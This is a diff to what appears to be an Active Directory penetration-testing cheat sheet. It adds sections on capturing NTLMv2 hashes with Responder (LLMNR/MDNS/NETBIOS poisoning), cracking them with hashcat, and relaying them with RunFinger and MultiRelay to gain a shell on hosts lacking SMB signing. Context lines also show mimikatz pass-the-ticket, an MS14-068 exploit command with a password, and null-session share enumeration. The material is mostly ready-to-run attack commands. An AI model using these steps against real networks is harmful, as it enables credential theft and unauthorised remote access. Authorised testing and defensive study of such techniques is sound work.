@@ -15,6 +15,8 @@
   * [Kerberoast](#kerberoast)
   * [Pass-the-Hash](#pass-the-hash)
   * [OverPass-the-Hash (pass the key)](#overpass-the-hash-pass-the-key)
+  * [Capturing and cracking NTLMv2 hashes](#capturing-and-cracking-ntlmv2-hashes)
+  * [NTLMv2 hashes relaying](#ntlv2-hashes-relaying)
   * [Dangerous Built-in Groups Usage](#dangerous-built-in-groups-usage)
   * [Trust relationship between domains](#trust-relationship-between-domains)
 * [Privilege Escalation](#privilege-escalation)
@@ -80,7 +82,7 @@ python ./ms14-068.py -u darthsidious@lab.adsecurity.org -p TheEmperor99! -s S-1-
 mimikatz.exe "kerberos::ptc c:\temp\TGT_darthsidious@lab.adsecurity.org.ccache"
 ```
 
-## Open Shares
+### Open Shares
 
 ```powershell
 smbmap -H 10.10.10.100    # null session
@@ -407,6 +409,29 @@ ktutil -k ~/mykeys add -p tgwynn@LAB.ROPNOP.COM -e arcfour-hma-md5 -w 1a59bd44fe
 kinit -t ~/mykers tgwynn@LAB.ROPNOP.COM
 klist
 ```
+
+## Capturing and cracking NTLMv2 hashes
+
+If any user in the network tries to access a machine and mistype the IP or the name, Responder will answer for it and ask for the NTLMv2 hash to access the resource. Responder will poison `LLMNR`, `MDNS` and `NETBIOS` requests on the network.
+
+```python
+python Responder.py -I eth0
+```
+
+Then crack the hash with `hashcat`
+
+```powershell
+hashcat -m 5600 -a 0 hash.txt crackstation.txt
+```
+
+## NTLMv2 hashes relaying
+
+If a machine has `SMB signing`:`disabled`, it is possible to use Responder with Multirelay.py script to perform an `NTLMv2 hashes relay` and get a shell access on the machine.
+
+1. Open the Responder.conf file and set the value of `SMB` and `HTTP` to `Off`.
+2. Run `python  RunFinger.py -i IP_Range` to detect machine with `SMB signing`:`disabled`.
+3. Run `python Responder.py -I <interface_card>` and `python MultiRelay.py -t <target_machine_IP> -u ALL`
+4. Wait for a shell
 
 ### Dangerous Built-in Groups Usage
 
